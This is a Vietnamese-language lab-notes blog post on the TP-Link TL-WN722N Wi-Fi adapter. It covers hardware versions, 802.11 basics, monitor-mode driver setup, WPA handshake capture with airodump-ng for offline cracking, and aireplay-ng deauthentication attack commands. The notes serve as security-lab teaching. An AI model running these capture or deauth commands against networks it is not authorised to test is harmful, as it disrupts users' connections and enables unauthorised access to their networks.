---
title: "TL-WN722N: Wi-Fi Adapter Lab Notes"
description: Hands-on notes on the TP-Link TL-WN722N USB Wi-Fi adapter — hardware specs, Wi-Fi fundamentals, monitor mode setup, WPA handshake capture, and deauth attacks.
pubDate: 2026-03-14
tags: [project, hardware, Wi-Fi, pentesting, network]
categories: [Projects]
toc: true
comments: false
---

## 1. Giới thiệu thiết bị

### 1.1. Tổng quan
TP-Link TL-WN722N là một thiết bị USB Wireless Adapter được sử dụng để kết nối máy tính với mạng Wi-Fi. Thiết bị hỗ trợ chuẩn IEEE 802.11 b/g/n, hoạt động chủ yếu trên băng tần 2.4 GHz.

### 1.2. Thông số kỹ thuật
- Loại thiết bị: USB Wireless Adapter  
- Chuẩn Wi-Fi: IEEE 802.11 b/g/n  
- Tốc độ tối đa: 150 Mbps (băng tần 2.4 GHz)  
- Giao tiếp: USB 2.0  
- Ăng-ten: 4 dBi (có thể tháo rời, chuẩn RP-SMA)  
- Hệ điều hành hỗ trợ: Windows, Linux, macOS (phiên bản cũ)

### 1.3. Công dụng
- Kết nối Wi-Fi cho máy tính không có card mạng không dây  
- Tăng khả năng thu sóng nhờ ăng-ten rời  
- Ứng dụng trong các phòng lab bảo mật (penetration testing)  
- Phân tích và kiểm thử hệ thống mạng không dây  

---

## 2. Các phiên bản phần cứng

| Version | Chipset           | Khả năng Pentest            |
|--------|------------------|-----------------------------|
| V1     | Atheros AR9271   | Tốt (monitor + injection)   |
| V2     | Realtek          | Hạn chế                     |
| V3/V4  | Realtek          | Ít dùng                     |

Thiết bị đang dùng: **V2**

---

## 3. Kiến thức nền tảng Wi-Fi (IEEE 802.11)

### 3.1. Wi-Fi là gì
- Công nghệ mạng không dây dùng sóng RF (Radio Frequency)  
- Hoạt động theo chuẩn IEEE 802.11  

### 3.2. Kiến trúc mạng Wi-Fi
- AP (Access Point): phát Wi-Fi  
- Client: thiết bị kết nối  
- SSID (Service Set Identifier): tên mạng  
- BSSID: MAC của AP  

### 3.3. Các chuẩn Wi-Fi

| Chuẩn    | Tốc độ         | Băng tần      |
|---------|----------------|---------------|
| 802.11b | 11 Mbps        | 2.4 GHz       |
| 802.11g | 54 Mbps        | 2.4 GHz       |
| 802.11n | 150–600 Mbps   | 2.4/5 GHz     |

### 3.4. Công nghệ chính

#### 3.4.1. DSSS (Direct Sequence Spread Spectrum)
- Sử dụng trong chuẩn 802.11b  
- Trải rộng tín hiệu để chống nhiễu tốt  
- Tốc độ tối đa ~11 Mbps  

#### 3.4.2. OFDM (Orthogonal Frequency Division Multiplexing)
- Sử dụng trong chuẩn 802.11g  
- Chia dữ liệu thành nhiều phần nhỏ, truyền song song  
- Tốc độ lên đến 54 Mbps  

#### 3.4.3. MIMO (Multiple Input Multiple Output)
- Sử dụng trong chuẩn 802.11n  
- Dùng nhiều ăng-ten truyền nhiều luồng dữ liệu  
- Tốc độ 150–600 Mbps  

---

## 4. Frame trong Wi-Fi

### 4.1. Các loại frame
- Management Frame → thiết lập & quản lý kết nối  
- Control Frame → điều khiển truy cập kênh truyền  
- Data Frame → truyền dữ liệu người dùng  

### 4.2. Một số frame quan trọng
- Beacon Frame → AP phát định kỳ  
- Probe Request / Probe Response → tìm mạng  
- Authentication Frame → xác thực  
- Association Frame → kết nối  

---

## 5. Monitor Mode

### 5.1. Khái niệm
Cho phép nghe toàn bộ traffic Wi-Fi mà không cần kết nối mạng.

### 5.2. Công cụ
- `airmon-ng` → bật monitor mode  
- `airodump-ng` → scan & capture  

### 5.3. Cài driver hỗ trợ monitor (V2 - Realtek)

```bash
sudo apt update
sudo apt install -y dkms git build-essential

git clone https://github.com/aircrack-ng/rtl8188eus
cd rtl8188eus

sudo make dkms_install
echo "blacklist r8188eu" | sudo tee /etc/modprobe.d/realtek.conf
sudo reboot

iwconfig

sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

---

## 6. Capture WPA/WPA2 Handshake

### 6.1. Khái niệm
Quá trình xác thực 4 bước giữa client và AP, sinh ra khóa mã hóa (PTK, GTK). Có thể dùng để crack mật khẩu offline.

### 6.2. Quy trình

1. Scan mạng:
```bash
sudo airodump-ng wlan0
```

2. Capture trên channel cụ thể:
```bash
sudo airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0
```

3. Sau khi bắt được handshake → file `.cap` → dùng để crack password

---

## 7. Deauthentication Attack

### 7.1. Khái niệm
Gửi frame giả để ngắt kết nối client, buộc client reconnect → bắt được handshake.

### 7.2. Gửi deauth toàn bộ user:
```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0
```

### 7.3. Gửi deauth 1 user cụ thể:
```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0
```

---

## 8. Tổng kết

TL-WN722N V2 với driver rtl8188eus hỗ trợ monitor mode và packet injection, phù hợp cho các bài lab Wi-Fi security cơ bản.
